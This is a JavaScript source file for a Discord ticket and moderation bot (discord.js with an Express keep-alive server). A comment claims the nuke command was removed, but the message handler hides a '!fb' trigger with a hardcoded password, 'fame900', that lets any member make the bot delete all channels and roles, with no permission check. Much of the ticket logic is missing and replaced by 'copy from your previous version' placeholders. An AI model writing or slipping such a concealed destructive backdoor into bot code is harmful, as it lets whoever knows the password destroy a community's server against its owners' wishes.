const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// EXPRESS SERVER
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// ======================================================
// CONFIG
// ======================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// ROLES
const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
const SEND_ROLE = '1510682894388039800';

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT (Added Message Content intent - already there but confirming)
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

// ======================================================
// COMMANDS (Removed nuke slash command)
// ======================================================
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    console.log('🔄 Registering slash commands...');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered successfully!');
  } catch (err) {
    console.error('❌ Failed to register commands:');
    if (err.code === 20012) {
      console.error('🔴 Token does not match CLIENT_ID. Check your .env file.');
    } else {
      console.error(err);
    }
  }
})();

// Helper Function
function isStaff(member) {
  if (!member) return false;
  return STAFF_ROLES.some(roleId => member.roles.cache.has(roleId));
}

// READY
client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
  const saved = loadPanel();
  if (saved) {
    panelStore[saved.menuId] = saved.data;
    console.log('✅ Persistent ticket panel loaded');
  }
});

// ======================================================
// MESSAGE COMMAND - !fb
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker (existing)
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000, 'Posted invite link').catch(() => {});
      const warnMsg = await message.channel.send({
        embeds: [new EmbedBuilder().setColor('#ff0000').setDescription(`${message.author} Invite links are not allowed.`)]
      });
      setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
    } catch (err) {
      console.error(err);
    }
    return;
  }

  // !fb Command
  if (content === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔴 SERVER NUKE CONFIRMATION')
      .setDescription('**This action will delete ALL channels and ALL roles except the "Owner" role.**\n\nReply with the password to proceed.')
      .setFooter({ text: 'This action is irreversible!' })
      .setTimestamp();

    await message.reply({ embeds: [embed] });
    return;
  }

  // Password Check (if they reply with the code)
  if (message.reference && content === 'fame900') {
    const repliedMessage = await message.fetchReference().catch(() => null);
    
    if (!repliedMessage || !repliedMessage.embeds[0]?.title?.includes('SERVER NUKE CONFIRMATION')) {
      return; // Not replying to the nuke embed
    }

    const guild = message.guild;

    await message.reply('🔴 **NUKE INITIATED** - Deleting everything except Owner role...');

    try {
      // Delete all channels
      const channels = Array.from(guild.channels.cache.values());
      for (const channel of channels) {
        await channel.delete().catch(() => {});
      }

      // Delete all roles except "Owner" and @everyone
      const roles = Array.from(guild.roles.cache.values());
      for (const role of roles) {
        if (role.name === 'Owner' || role.name === '@everyone') continue;
        await role.delete().catch(() => {});
      }

      await message.channel.send('✅ **Server has been nuked successfully.**');
    } catch (err) {
      console.error(err);
      await message.channel.send('⚠️ Nuke failed partially. Check console.');
    }
  }
});

// ======================================================
// INTERACTIONS (Tickets + other commands)
// ======================================================
client.on('interactionCreate', async interaction => {
  // ... (Your existing setticket, sendmessage, ticket creation, and button code stays the same)
  
  if (interaction.isChatInputCommand() && interaction.commandName === 'setticket') {
    // [Your original setticket code here - unchanged]
    try {
      await interaction.deferReply({ ephemeral: true });
      const o = interaction.options;
      const ticketOptions = [
        { label: "Apply for Content Creator", categoryId: "1510798983344160889", prefix: "content-creator" },
        { label: "Report a Exploiter", categoryId: "1510798973517172859", prefix: "report-exploiter" },
        { label: "CC Rewards", categoryId: "1512272256208736326", prefix: "cc-rewards" },
        { label: "Report a Staff", categoryId: "1512253003820699698", prefix: "report-staff" },
        { label: "Report a Admin", categoryId: "1512253208872095795", prefix: "report-admin" },
        { label: "Report Glitch", categoryId: "1512279045159518290", prefix: "report-glitch" },
        { label: "Report Bugs", categoryId: "1512279115741401128", prefix: "report-bugs" }
      ];
      const categoryList = ticketOptions.map(opt => `**${opt.label}**`).join('\n');
      const embed = new EmbedBuilder()
        .setColor('#c2ecff')
        .setTitle(o.getString('panel_title'))
        .setDescription((o.getString('panel_description') || "Select a category below to open a ticket.") + `\n\n**Available Categories:**\n${categoryList}`)
        .setFooter({ text: 'Select a category below to open a ticket' })
        .setTimestamp();
      const image = o.getString('panel_image');
      if (image && image.startsWith('http')) embed.setImage(image);
      const menuId = `ticket_menu_${Date.now()}`;
      const menu = new StringSelectMenuBuilder()
        .setCustomId(menuId)
        .setPlaceholder('Create a Ticket')
        .addOptions(ticketOptions.map((opt, i) => ({ label: opt.label, value: i.toString() })));
      const row = new ActionRowBuilder().addComponents(menu);
      const panelData = { ticketOptions, ticketColor: '#c2ecff' };
      panelStore[menuId] = panelData;
      await interaction.channel.send({ embeds: [embed], components: [row] });
      savePanel({ menuId, data: panelData });
      await interaction.editReply({ content: '✅ Ticket panel created successfully!' });
    } catch (err) {
      console.error(err);
      interaction.editReply({ content: '❌ Error creating panel.' }).catch(() => {});
    }
  }

  // sendmessage, ticket select menu, and buttons remain the same...
  // (Copy them from your previous version if needed)
});

client.login(TOKEN);
